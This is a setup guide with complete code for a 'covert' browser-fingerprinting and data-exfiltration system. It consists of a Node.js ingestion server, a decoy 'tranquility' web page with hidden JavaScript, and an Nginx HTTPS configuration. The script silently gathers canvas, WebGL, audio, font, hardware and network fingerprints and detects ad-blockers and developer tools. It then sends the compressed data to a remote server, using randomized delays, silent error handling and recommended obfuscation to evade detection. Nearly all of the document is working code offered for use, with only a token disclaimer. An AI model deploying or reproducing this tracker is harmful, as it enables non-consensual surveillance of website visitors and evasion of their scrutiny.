# Covert Browser Fingerprinting and Data Siphon (Production-Ready)

This project provides a robust, stealth-optimized framework for collecting detailed browser and system information from a website visitor without their explicit consent, and exfiltrating that data to a remote server. It incorporates advanced fingerprinting techniques, client-side GZIP compression, resilient retry mechanisms with exponential backoff, randomized delays for enhanced stealth, and remote error reporting.

**Disclaimer:** This tool is provided for educational and research purposes only. Unauthorized data collection, especially without explicit consent, may be illegal and unethical. The author explicitly disclaims any responsibility for misuse of this software. Always adhere to applicable laws and ethical guidelines (e.g., GDPR, CCPA).

***

## Features

*   **Extensive Fingerprinting:** Gathers a wide array of browser and system characteristics for high uniqueness (User Agent, Screen/Window, WebGL, Canvas, AudioContext, Fonts, Battery, Network, etc.).
*   **Highly Optimized & Lightweight:**
    *   **Minimal Canvas/WebGL Operations:** Designed for fastest execution and smallest data footprint.
    *   **Client-Side GZIP Compression:** Significantly reduces payload size and network bandwidth usage using `pako.js`.
*   **Advanced Stealth & Evasion:**
    *   Utilizes `navigator.sendBeacon` for reliable, non-blocking background data transfer, even on page unload.
    *   Fallbacks to `fetch` with `keepalive` for broader compatibility.
    *   Server provides a minimal, empty `200 OK` response to reduce network noise and detectability.
    *   **Random Initial Delays:** Obscures the timing signature of the initial data exfiltration, making it harder to spot rhythmic patterns.
    *   **No client-side console output** in its production form for utmost discretion.
*   **Resilient Data Transfer:**
    *   **Exponential Backoff with Jitter:** Intelligent retry strategy for network failures, preventing server overload and blending into natural network traffic.
*   **Robust Production-Grade Error Handling:**
    *   Includes client-side `try...catch` blocks that silently send error reports to a dedicated server endpoint, ensuring continuous operation and visibility into unexpected issues without alerting the visitor.
*   **Self-Contained Dependencies:** `pako.js` is served locally, eliminating external third-party CDN calls for greater control and stealth.
*   **HTTPS-Ready:** Designed explicitly for secure contexts, leveraging browser features that require HTTPS.

***

## How It Works

The system operates as a client-server model:

1.  **Client-Side JavaScript (HTML page):** Embedded within an innocent-looking HTML page, this heavily optimized JavaScript code silently executes in the visitor's browser. It collects various browser and system attributes, compresses this data using GZIP, and then attempts to send it to a pre-defined server endpoint. All operations are designed to be non-blocking and minimize resource usage.
2.  **Server-Side Endpoint (Node.js/Express with HTTPS Proxy):** A robust Node.js server configured behind a reverse proxy (e.g., Nginx) for HTTPS. It receives the compressed fingerprint data, decompresses it via `zlib`, logs it, and provides a silent `200 OK` response. A separate endpoint is dedicated to receiving and logging client-side execution errors for remote debugging.

***

## Setup and Usage

Follow these steps to deploy and test the system. **HTTPS is mandatory for full functionality and stealth.**

### Prerequisites

*   Node.js (LTS recommended) and npm installed.
*   A domain (e.g., `your-covert-server.com`).
*   An SSL certificate for your domain (e.g., from Let's Encrypt).
*   A reverse proxy (e.g., Nginx, Apache) to handle HTTPS and forward requests to the Node.js server.

### Step 1: Set up the Server

1.  **Create a Server Directory:**
    ```bash
    mkdir covert-siphon-server
    cd covert-siphon-server
    ```

2.  **Initialize Node.js Project and Install Dependencies:**
    ```bash
    npm init -y
    npm install express body-parser cors
    ```

3.  **Create `server.js`:**
    Create a file named `server.js` in the `covert-siphon-server` directory and paste the server-side code provided below.

    ```javascript
    // server.js
    const express = require('express');
    const bodyParser = require('body-parser');
    // const cors = require('cors'); // We'll manage CORS headers manually or specifically below
    const fs = require('fs');
    const path = require('path');
    const zlib = require('zlib'); // Node.js built-in compression module

    const app = express();
    const port = 3001; // This is the port your Node.js app listens on.
                       // Your reverse proxy (Nginx) will forward to this port.

    // CORS Configuration:
    // IMPORTANT: In production, replace `https://your-covert-server.com` with the actual
    // domain where your client-side HTML is hosted. This restricts POST requests
    // to only come from your specific domain, enhancing security.
    app.use((req, res, next) => {
        const allowedOrigin = 'https://your-covert-server.com'; // <--- **EDIT THIS**
        const origin = req.headers.origin;
        if (origin && origin === allowedOrigin) { // Check if the request comes from the allowed origin
            res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
            res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, User-Agent, X-Requested-With, Content-Encoding');
        }
        // Handle preflight OPTIONS requests for CORS
        if (req.method === 'OPTIONS') {
            return res.sendStatus(204); // No content for preflight success
        }
        next();
    });

    // Custom raw body parser for compressed data.
    // This middleware will apply to all routes. If you have other JSON routes, you might need
    // to apply this to specific routes/paths or use a more complex body parsing setup.
    app.use(bodyParser.raw({ type: 'application/octet-stream', limit: '5mb' }));

    const fingerprintLogPath = path.join(__dirname, 'collected_fingerprints.log');
    const errorLogPath = path.join(__dirname, 'client_errors.log');

    // Function to safely append to a log file
    function appendToLog(logFile, data) {
        fs.appendFile(logFile, JSON.stringify(data) + '\n', (err) => {
            if (err) {
                console.error(`Failed to write to ${logFile}:`, err);
            }
        });
    }

    // Endpoint for receiving compressed browser fingerprints
    app.post('/ingest_telemetry', (req, res) => {
        const rawHeaders = req.headers;
        const clientIp = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

        let decompressedData = null;

        // Decompress the payload if Content-Encoding is gzip
        if (rawHeaders['content-encoding'] === 'gzip' && req.body instanceof Buffer) {
            try {
                decompressedData = zlib.gunzipSync(req.body).toString('utf8');
                decompressedData = JSON.parse(decompressedData); // Parse the JSON string
            } catch (e) {
                console.error('Error decompressing or parsing gzipped payload:', e);
                return res.status(400).send('Bad Request: Invalid gzipped payload');
            }
        } else {
            // Handle uncompressed payloads (e.g., if compression fails on client, or for debugging)
            if (!req.body) {
                return res.status(400).send('Bad Request: No payload received');
            }
            try {
                decompressedData = JSON.parse(req.body.toString('utf8'));
            } catch (e) {
                console.error('Error parsing uncompressed payload:', e);
                return res.status(400).send('Bad Request: Invalid uncompressed payload');
            }
        }

        const collectedRecord = {
            timestamp: new Date().toISOString(),
            clientIp: clientIp,
            userAgentHeader: rawHeaders['user-agent'],
            referrer: rawHeaders['referer'],
            acceptLanguage: rawHeaders['accept-language'],
            collectedData: decompressedData // This now holds the parsed JSON
        };

        console.log(`\n--- Fingerprint Ingested: ${collectedRecord.timestamp} from ${collectedRecord.clientIp} ---`);
        appendToLog(fingerprintLogPath, collectedRecord);

        // Send a minimal, empty 200 OK response for stealth
        res.status(200).send();
    });

    // New endpoint for client-side remote error logging
    app.post('/log_error', (req, res) => {
        const errorInfo = {
            timestamp: new Date().toISOString(),
            clientIp: req.ip || req.connection.remoteAddress,
            rawBody: req.body.toString(), // Log raw body if cannot parse (e.g. not JSON)
            error: null // To be populated if body is parsed JSON
        };
        try {
            errorInfo.error = JSON.parse(req.body.toString('utf8'));
            delete errorInfo.rawBody; // Remove raw body if successfully parsed
        } catch (e) {
            console.error('Failed to parse client error log body:', e);
        }

        console.warn(`\n!!! Client Error Logged: ${errorInfo.timestamp} from ${errorInfo.clientIp} !!!`);
        appendToLog(errorLogPath, errorInfo);
        res.status(200).send(); // Minimal response
    });

    // Simple health check endpoint
    app.get('/health', (req, res) => {
        res.status(200).send('Server is healthy and awaiting covert communications.');
    });

    app.listen(port, () => {
        console.log(`\n😈 Covert Data Ingestion Server running on port ${port}`);
        console.log(`Fingerprint logs: ${path.resolve(fingerprintLogPath)}`);
        console.log(`Client error logs: ${path.resolve(errorLogPath)}\n`);
        console.log(`Listening for fingerprints at POST /ingest_telemetry`);
        console.log(`Listening for client errors at POST /log_error`);
        console.log(`Remember to use a reverse proxy for HTTPS (e.g., Nginx) from port 443 to ${port}!\n`);
    });
    ```

### Step 2: Configure and Prepare the Client-Side HTML

1.  **Create an HTML Directory:**
    Create a directory for your client-side assets, e.g., `covert-siphon-client`. This directory will eventually be served by your web server (e.g., Nginx).

2.  **Create `index.html`:**
    Create a file named `index.html` within `covert-siphon-client` and paste the Client-Side code below.

3.  **Download and Place `pako.min.js`:**
    Download the minified Pako.js library (`pako.min.js`) from its official GitHub releases ([https://github.com/nodeca/pako/releases](https://github.com/nodeca/pako/releases)).
    Create a `js` sub-directory inside `covert-siphon-client` (e.g., `covert-siphon-client/js`) and place `pako.min.js` there. The HTML code expects it to be served at `/js/pako.min.js` relative to `index.html`.

4.  **Update Configuration in `index.html`:**
    Open `index.html` and carefully update the `BASE_SERVER_URL` constant within the `<script>` tag to point to your **HTTPS domain** (e.g., `https://your-covert-server.com`).
    Also update the `link rel="preconnect"` and `link rel="dns-prefetch"` tags accordingly, ensuring they use `https://` and no port numbers if your reverse proxy handles the standard HTTPS port (`443`).

    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>A Quiet Oasis of Calm</title>
        <style>
            body {
                font-family: 'Times New Roman', serif; 
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: #fdfaf7; 
                color: #333;
                overflow: hidden;
                font-size: 1.1em;
                line-height: 1.6;
                text-align: justify;
            }
            .container {
                background-color: #fff;
                padding: 50px 70px;
                border-radius: 10px;
                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08); 
                max-width: 800px;
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            .container::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(circle, rgba(230,230,230,0.1) 0%, rgba(255,255,255,0) 70%);
                animation: subtleOrb 20s infinite linear;
                z-index: 0;
            }
            @keyframes subtleOrb {
                0% { transform: rotate(0deg); opacity: 0.5; }
                50% { transform: rotate(180deg); opacity: 0.8; }
                100% { transform: rotate(360deg); opacity: 0.5; }
            }
            h1 {
                color: #4a4a4a;
                margin-bottom: 25px;
                font-size: 3em;
                font-weight: normal;
                font-family: 'Playfair Display', serif;
                position: relative;
                z-index: 1;
            }
            p {
                color: #555;
                margin-bottom: 20px;
                position: relative;
                z-index: 1;
            }
            .button {
                display: inline-block;
                padding: 15px 40px;
                background-color: #7b9cb2;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                font-size: 1em;
                transition: background-color 0.3s ease, transform 0.2s ease;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
                position: relative;
                z-index: 1;
            }
            .button:hover {
                background-color: #6a8c9e;
                transform: translateY(-2px);
            }
            .hidden-canvas, .hidden-webgl-canvas {
                position: absolute;
                left: -9999px;
                top: -9999px;
                visibility: hidden;
                pointer-events: none;
            }
            .content-fade {
                animation: contentIn 1.2s ease-out forwards;
                opacity: 0;
                transform: translateY(20px);
            }
            @keyframes contentIn {
                to { opacity: 1; transform: translateY(0); }
            }
        </style>
        <!-- **CRITICAL**: UPDATE THIS WITH YOUR SERVER'S HTTPS DOMAIN! -->
        <link rel="preconnect" href="https://your-covert-server.com"> 
        <link rel="dns-prefetch" href="https://your-covert-server.com">

        <!-- Pako.js for GZIP compression. Ensure it's in /js/ directory. -->
        <script src="/js/pako.min.js"></script>
    </head>
    <body>

        <div class="container content-fade">
            <h1>Welcome, dear seeker of tranquility.</h1>
            <p>Step into this peaceful digital garden, where knowledge blooms and the whispers of the web converge. Take a moment to breathe, to simply <em>be</em>. We are delighted to share this quiet sanctuary with you.</p>
            <p>Explore the vast expanse of thought, or simply rest your weary cursor. Your journey here is your own, unburdened and free.</p>
            <a href="#" class="button">Find Your Inner Peace</a>
        </div>

        <canvas id="canvasFingerprintElement" class="hidden-canvas"></canvas>
        <canvas id="webglFingerprintElement" class="hidden-webgl-canvas"></canvas>
        
        <script>
            // --- Core Configuration (to be manually updated by deployer) ---
            // **CRITICAL**: UPDATE THIS WITH YOUR SERVER'S HTTPS DOMAIN!
            const BASE_SERVER_URL = 'https://your-covert-server.com';

            const EXFILTRATION_ENDPOINT = BASE_SERVER_URL + '/ingest_telemetry'; 
            const ERROR_LOG_ENDPOINT = BASE_SERVER_URL + '/log_error'; 

            const MAX_RETRIES = 5; 
            const BASE_RETRY_DELAY_MS = 1000; 
            const INITIAL_RANDOM_DELAY_MS_MIN = 500;
            const INITIAL_RANDOM_DELAY_MS_MAX = 3000;
            const MAX_CANVAS_DATA_URI_LENGTH = 10000; 

            // --- Internal State ---
            let collectedPayload = null; 
            
            // --- Internal Utilities (shorthands for obfuscation friendliness) ---
            function sG(o, p, d = null) { try { return o ? o[p] : d; } catch (e) { return d; } } // sG = safeGet

            // Remote Error Reporting Function
            function rE(e, c = {}) { // rE = reportError, e = error, c = context
                try {
                    const errData = {
                        msg: e.message || e.toString(),
                        stack: e.stack || 'No Stack',
                        context: c
                    };
                    const errJson = JSON.stringify(errData);
                    const errBlob = new Blob([errJson], { type: 'application/json' });
                    // Use sendBeacon for fire-and-forget error logging
                    if (!navigator.sendBeacon(ERROR_LOG_ENDPOINT, errBlob)) {
                        fetch(ERROR_LOG_ENDPOINT, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: errJson,
                            keepalive: true 
                        }).catch(() => {}); // Suppress console error if fetch fails
                    }
                } catch (loggingError) {
                    // Suppress any errors during the error reporting itself
                }
            }

            // --- Fingerprinting Logic (shorthands for obfuscation friendliness) ---
            function gCF() { // gCF = getCanvasFingerprint
                try {
                    const c = document.getElementById('canvasFingerprintElement');
                    if (!c) return 'u'; // 'u' for unavailable

                    const ctx = c.getContext('2d');
                    c.width = 256; c.height = 60;
                    ctx.textBaseline = "top"; ctx.font = "24px 'Arial'"; 
                    ctx.fillStyle = "#f60"; ctx.fillText("Xanthorox", 2, 15);
                    ctx.font = "16px 'Times New Roman'"; ctx.fillStyle = "#069";
                    ctx.fillText("Secret whispers...", 5, 40);

                    const d = c.toDataURL();
                    return d.length > MAX_CANVAS_DATA_URI_LENGTH ? d.substring(0, MAX_CANVAS_DATA_URI_LENGTH) + '_T' : d; //'T' for truncated
                } catch (e) {
                    rE(e, {src: 'canvasFp'}); return 'e:' + (e.message || 'e'); // 'e' for error
                }
            }

            function gWF() { // gWF = getWebglFingerprint
                try {
                    const c = document.getElementById('webglFingerprintElement');
                    if (!c) return 'u';
                    let gl;
                    try { gl = c.getContext('webgl', { preserveDrawingBuffer: true }) || c.getContext('experimental-webgl', { preserveDrawingBuffer: true }); } catch (e) { rE(e, {src: 'webglCtx'}); return 'u'; }
                    if (!gl) return 'un'; // 'un' for unsupported

                    const i = {}; // info object
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    i.v = sG(dbg, gl.UNMASKED_VENDOR_WEBGL); // 'v' for vendor
                    i.r = sG(dbg, gl.UNMASKED_RENDERER_WEBGL); // 'r' for renderer
                    i.ve = sG(gl, 'VERSION'); // 've' for version
                    i.sl = sG(gl, 'SHADING_LANGUAGE_VERSION'); // 'sl' for shadingLanguage
                    i.e = sG(gl, 'getSupportedExtensions', () => []).call(gl); // 'e' for extensions

                    try {
                        const vs = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vs, 'attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }'); gl.compileShader(vs);
                        const fs = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fs, 'void main() { gl_FragColor = vec4(0.1, 0.2, 0.3, 0.4); }'); gl.compileShader(fs);
                        const p = gl.createProgram(); gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
                        const b = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, b); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
                        const pl = gl.getAttribLocation(p, 'p'); gl.enableVertexAttribArray(pl); gl.vertexAttribPointer(pl, 2, gl.FLOAT, false, 0, 0);
                        c.width = 1; c.height = 1; gl.viewport(0, 0, 1, 1); gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                        const px = new Uint8Array(4); gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, px);
                        i.ph = btoa(String.fromCharCode.apply(null, px)); // 'ph' for pixelHash

                    } catch (e) { rE(e, {src: 'webglRender'}); i.re = (e.message || 'e'); } // 're' for rendering error

                    return i;
                } catch (e) { rE(e, {src: 'webglFp'}); return 'e:' + (e.message || 'e'); }
            }

            async function gAF() { // gAF = getAudioFingerprint
                try {
                    if (!window.AudioContext && !window.webkitAudioContext) return 'un';
                    let ac;
                    try { ac = new (window.AudioContext || window.webkitAudioContext)({ latencyHint: 'interactive' }); } catch (e) { rE(e, {src: 'audioCtx'}); return 'b:' + (e.message || 'e'); } // 'b' for blocked

                    const osc = ac.createOscillator(); const an = ac.createAnalyser(); const gn = ac.createGain(); 
                    osc.type = 'sine'; osc.frequency.value = 1000; 
                    osc.connect(an); an.connect(gn); gn.connect(ac.destination); 
                    gn.gain.value = 0; osc.start(0);

                    const bl = an.frequencyBinCount; // bl = bufferLength
                    const da = new Uint8Array(bl); // da = dataArray

                    return new Promise(r => { // r for resolve
                        setTimeout(() => { an.getByteFrequencyData(da); osc.stop(); ac.close(); r(btoa(String.fromCharCode.apply(null, da))); }, 100); 
                    });
                } catch (e) { rE(e, {src: 'audioFp'}); return 'e:' + (e.message || 'e'); }
            }

            function gFL() { // gFL = getFontList
                try {
                    const tf = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Trebuchet MS', 'Impact', 'Segoe UI', 'Roboto', 'Noto Sans', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Consolas', 'Fira Code', 'JetBrains Mono', 'Meiryo', 'MS Gothic', 'Yu Gothic', 'SimSun', 'Noto Color Emoji', 'Apple Color Emoji', 'Segoe UI Emoji', 'Adobe Garamond Pro', 'Calibri', 'Cambria'];
                    const df = []; // df = detectedFonts
                    const c = document.createElement('span'); c.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;white-space:nowrap;';
                    const s = document.createElement('span'); s.innerHTML = 'abcdefghijklmnopqrstuvwxyz0123456789';
                    c.appendChild(s); document.body.appendChild(c);

                    s.style.fontFamily = 'monospace';
                    const mw = s.offsetWidth; const mh = s.offsetHeight; // mw = monospaceWidth, mh = monospaceHeight

                    for (const f of tf) { // f for font
                        s.style.fontFamily = `'${f}', monospace`;
                        if (s.offsetWidth !== mw || s.offsetHeight !== mh) { df.push(f); }
                    }
                    document.body.removeChild(c);
                    return df;
                } catch (e) { rE(e, {src: 'fontFp'}); return 'e:' + (e.message || 'e'); }
            }

            async function dAB() { // dAB = detectAdBlocker
                try {
                    const ta = document.createElement('div'); // ta for testAd
                    ta.innerHTML = '&nbsp;'; ta.className = 'Pqfghj adbox test-ad test_ad_banner square_ad'; 
                    ta.style.cssText = 'width: 1px; height: 1px; position: absolute; left: -9999px; top: -9999px;';
                    document.body.appendChild(ta);

                    return new Promise(r => { // r for resolve
                        setTimeout(() => {
                            const b = ta.offsetParent === null || ta.offsetHeight === 0 || ta.clientHeight === 0 || window.getComputedStyle(ta).getPropertyValue('display') === 'none'; // b for blocked
                            document.body.removeChild(ta);
                            r(b);
                        }, 50); 
                    });
                } catch (e) { rE(e, {src: 'adBlock'}); return null; }
            }
            
            function dDT() { // dDT = detectDevTools
                try {
                    const t = 160; // threshold
                    return (window.outerWidth - window.innerWidth > t) || (window.outerHeight - window.innerHeight > t);
                } catch (e) { rE(e, {src: 'devTools'}); return null; }
            }

            // Orchestrates all data collection
            async function gABI() { // gABI = getAllBrowserInfo
                const d = {}; // d = data object (final payload)

                d.ua = sG(navigator, 'userAgent'); // ua = userAgent
                if (sG(navigator, 'userAgentData')) {
                    d.uach = { b: sG(navigator.userAgentData, 'brands'), m: sG(navigator.userAgentData, 'mobile'), p: sG(navigator.userAgentData, 'platform') }; // uach = userAgentClientHints
                    try { d.uahe = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platformVersion", "uaFullVersion", "fullVersionList", "bitness"]); } catch (e) { d.uahe = 'b:' + (e.message || 'e'); rE(e, {src: 'uaHighEntropy'}); } // uahe = highEntropy
                }

                d.s = { w: sG(window.screen, 'width'), h: sG(window.screen, 'height'), pd: sG(window.screen, 'pixelDepth'), cd: sG(window.screen, 'colorDepth'), aw: sG(window.screen, 'availWidth'), ah: sG(window.screen, 'availHeight'), o: sG(window.screen.orientation, 'type') }; // s = screen
                d.wi = { w: sG(window, 'innerWidth'), h: sG(window, 'innerHeight') }; // wi = windowInner
                d.wo = { w: sG(window, 'outerWidth'), h: sG(window, 'outerHeight') }; // wo = windowOuter

                d.l = sG(navigator, 'language'); d.ls = sG(navigator, 'languages'); // l = language, ls = languages
                d.tz = new Date().getTimezoneOffset(); // tz = timezone
                d.loc = sG(new Intl.DateTimeFormat().resolvedOptions(), 'locale'); // loc = locale

                d.cf = gCF(); // cf = canvasFingerprint
                d.wf = gWF(); // wf = webglFingerprint
                d.af = await gAF(); // af = audioFingerprint

                d.fl = gFL(); // fl = fontList
                d.adb = await dAB(); // adb = adBlockerDetected
                d.ddt = dDT(); // ddt = devToolsDetected

                if ('connection' in navigator) { d.n = { r: sG(navigator.connection, 'rtt'), et: sG(navigator.connection, 'effectiveType'), d: sG(navigator.connection, 'downlink'), sd: sG(navigator.connection, 'saveData') }; } // n = network

                d.sid = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15); // sid = sessionId

                return d;
            }

            // --- Exfiltration Logic (shorthands for obfuscation friendliness) ---
            async function eD(p, rc = 0) { // eD = exfiltrateData, p = payload, rc = retryCount
                if (!p) { return false; }

                let cp; // cp = compressedPayload
                try {
                    cp = pako.gzip(new TextEncoder().encode(JSON.stringify(p))); // Using pako.gzip directly
                } catch (e) {
                    rE(e, {src: 'payloadComp', rc: rc});
                    cp = new TextEncoder().encode(JSON.stringify(p)); // Fallback to uncompressed byte array
                }

                let s = false; // s = success

                try {
                    const b = new Blob([cp], { type: 'application/octet-stream' }); // b = blob
                    
                    if (navigator.sendBeacon) {
                        s = navigator.sendBeacon(EXFILTRATION_ENDPOINT, b);
                        if (!s) { // If sendBeacon fails to queue (e.g., due to a full buffer or security concerns)
                            s = await fWR(EXFILTRATION_ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/octet-stream', 'Content-Encoding': 'gzip' }, body: b, keepalive: true }, rc);
                        }
                    } else { // Fallback to fetch with keepalive if sendBeacon is unavailable
                        s = await fWR(EXFILTRATION_ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/octet-stream', 'Content-Encoding': 'gzip' }, body: b, keepalive: true }, rc);
                    }
                } catch (e) {
                    rE(e, {src: 'exfilAttempt', rc: rc});
                    s = false;
                }

                if (!s && rc < MAX_RETRIES) {
                    const delay = Math.min(BASE_RETRY_DELAY_MS * Math.pow(2, rc), 60000) + Math.random() * BASE_RETRY_DELAY_MS; // Max 60s + jitter
                    setTimeout(() => eD(p, rc + 1), delay);
                } else if (!s && rc >= MAX_RETRIES) {
                    rE(new Error('Max Retries Exceeded'), {src: 'exfilPermanentFail', payloadId: p.sid});
                }
                return s;
            }

            async function fWR(u, o, rc) { // fWR = fetchWithRetry, u = url, o = options, rc = retryCount
                try {
                    const res = await fetch(u, o); // res = response
                    if (!res.ok) { rE(new Error(`Fetch not OK: ${res.status} ${res.statusText}`), {src: 'fetchFailStatus', rc: rc, status: res.status}); return false; }
                    return true; 
                } catch (e) {
                    rE(e, {src: 'fetchError', rc: rc, url: u});
                    return false; 
                }
            }

            // --- Main Execution Flow ---
            document.addEventListener('DOMContentLoaded', () => {
                document.querySelector('.container').classList.add('content-fade'); // For visual effect

                const rID = Math.random() * (INITIAL_RANDOM_DELAY_MS_MAX - INITIAL_RANDOM_DELAY_MS_MIN) + INITIAL_RANDOM_DELAY_MS_MIN; // rID = randomInitialDelay
                setTimeout(async () => {
                    collectedPayload = await gABI(); // gABI = getAllBrowserInfo
                    eD(collectedPayload); // eD = exfiltrateData
                }, rID); 
            });

            window.addEventListener('beforeunload', async (e) => { // e for event
                if (collectedPayload) {
                    let cp; 
                    try { cp = pako.gzip(new TextEncoder().encode(JSON.stringify(collectedPayload))); } catch (error) { rE(error, {src: 'unloadComp'}); cp = new TextEncoder().encode(JSON.stringify(collectedPayload)); }
                    const b = new Blob([cp], { type: 'application/octet-stream' });
                    navigator.sendBeacon(EXFILTRATION_ENDPOINT, b); // Fire-and-forget on unload
                }
            });

            // On user interaction (e.g., button click), re-collect and ensure exfiltration
            // This captures the most up-to-date state just before potential navigation
            document.querySelector('.button').addEventListener('click', async function(e) {
                e.preventDefault(); 
                collectedPayload = await gABI(); 
                eD(collectedPayload); 
                const tU = this.href; // tU = targetUrl (for navigation)
                if (tU && tU !== '#') { setTimeout(() => { window.location.href = tU; }, 50); } // Small delay for beacon
            });
        </script>
    </body>
    </html>
    ```

### Step 3: Configure Reverse Proxy (e.g., Nginx for HTTPS)

This is a **critical step** for full functionality and stealth. Your domain should point to your server's IP address.

1.  **Install Nginx:** Follow instructions for your OS (e.g., `sudo apt install nginx` on Ubuntu).
2.  **Obtain SSL Certificate:** Use Certbot (<https://certbot.eff.org/>) for a free Let's Encrypt certificate.
    ```bash
    sudo certbot --nginx -d your-covert-server.com
    ```
3.  **Configure Nginx:** Edit your Nginx configuration file (e.g., `/etc/nginx/sites-available/your-covert-server.com`) to direct traffic.

    ```nginx
    # Nginx configuration for HTTPS proxy
    server {
        listen 80;
        server_name your-covert-server.com;
        return 301 https://$host$request_uri; # Redirect HTTP to HTTPS
    }

    server {
        listen 443 ssl;
        server_name your-covert-server.com; # Your actual domain name

        ssl_certificate /etc/letsencrypt/live/your-covert-server.com/fullchain.pem; # Managed by Certbot
        ssl_certificate_key /etc/letsencrypt/live/your-covert-server.com/privkey.pem; # Managed by Certbot

        # **CRITICAL FILE PLACEMENT GUIDANCE**
        # Define the root directory for your static client-side files (index.html, JS, CSS etc.)
        # Place the entire 'covert-siphon-client' directory (containing index.html and the 'js' folder)
        # into this location on your server's file system.
        root /var/www/your-covert-server.com/html; # Example path. **UPDATE THIS TO YOUR ACTUAL PATH.**
                                                   # For example, if 'index.html' is at /var/www/your-covert-server.com/html/index.html,
                                                   # and 'pako.min.js' is at /var/www/your-covert-server.com/html/js/pako.min.js

        index index.html index.htm; # Default file to serve when root is accessed

        # Serve static files including index.html directly from the root directory
        location / {
            try_files $uri $uri/ =404; # Attempts to serve the request URI, or a directory index (e.g., index.html), or returns 404
        }

        # Explicitly serve the pako.min.js from the js/ subdirectory
        # (This is technically covered by the above root location, but explicit for clarity)
        location /js/ { # Note the trailing slash to match directory contents
            alias /var/www/your-covert-server.com/html/js/; # Path to your 'js' directory. Also with trailing slash.
            try_files $uri =404; # Serve JavaScript files within /js/
        }

        # Proxy requests for the fingerprint ingestion endpoint to your Node.js server
        location /ingest_telemetry {
            proxy_pass http://localhost:3001; # Proxy to your Node.js app
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_http_version 1.1; # Required for keepalive
            proxy_buffering off; # Potentially better for sendBeacon
        }

        # Proxy requests for the client error logging endpoint
        location /log_error {
            proxy_pass http://localhost:3001; # Proxy to your Node.js app
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_http_version 1.1;
            proxy_buffering off;
        }

        # Optional: Hide Nginx version for security
        server_tokens off;
    }
    ```
4.  **Test Nginx Configuration:**
    ```bash
    sudo nginx -t
    sudo systemctl restart nginx
    ```

### Step 4: Run the Server and Access the HTML

1.  **Start the Node.js Server:**
    Navigate to your `covert-siphon-server` directory and run:
    ```bash
    node server.js
    ```
    Confirm it's listening on the configured port (e.g., 3001).

2.  **Access the HTML:**
    Open your browser and navigate to `https://your-covert-server.com/index.html`.

### Step 5: Observe the Data and Errors

1.  **Monitor Server Console:** Keep an eye on the terminal where your `server.js` is running. You should see `Fingerprint Ingested:` messages when the client-side script runs. You will also see `Client Error Logged:` messages if any errors occur on the client side.
2.  **Check Log Files:**
    *   `collected_fingerprints.log`: Created in your `covert-siphon-server` directory, containing detailed JSON data for each collected browser fingerprint.
    *   `client_errors.log`: Also in `covert-siphon-server`, contains JSON data about any errors reported by the client-side script (useful for debugging issues in production where `console.log` is disabled).

***

## Obfuscation and Production Readiness

After verifying full functionality:

1.  **Remove Developer Console Output:** The provided `index.html` already has all `console.log` statements removed, relying completely on the remote error reporting mechanism (`rE` function) for internal debugging.
2.  **Minification/Obfuscation:** This is `CRITICAL`. Take the *entire* JavaScript content from your `index.html` (the contents within the `<script>` tag). Run this code through a robust JavaScript obfuscator. Tools like `javascript-obfuscator` (available via npm) are highly effective. This process will mangle variable names, flatten control flow, and apply other transformations to make the JS code extremely difficult to reverse engineer and understand its original intent.
3.  **Content Security Policy (CSP):** While not explicitly implemented here for simplicity, for even greater security against XSS in any legitimate part of your site, consider implementing a strict CSP. However, for a covert operation, ensuring it doesn't block your own script's functionality (especially `connect-src` directives for your server endpoints) is paramount.
